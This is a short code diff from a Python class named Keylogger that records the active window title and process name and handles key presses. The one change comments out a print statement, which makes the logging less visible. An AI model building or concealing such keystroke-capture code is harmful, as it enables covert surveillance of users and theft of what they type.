@@ -27,7 +27,7 @@ class Keylogger:
 			elif self.last_window_title != title:
 				self.last_window_title = title
 				self.log_window_title = f'[{title}]-[{process_name}]'
-				print(self.log_window_title)
+				# print(self.log_window_title)
 
 	def on_press(self, key):
 		key = self.filter_key(key)
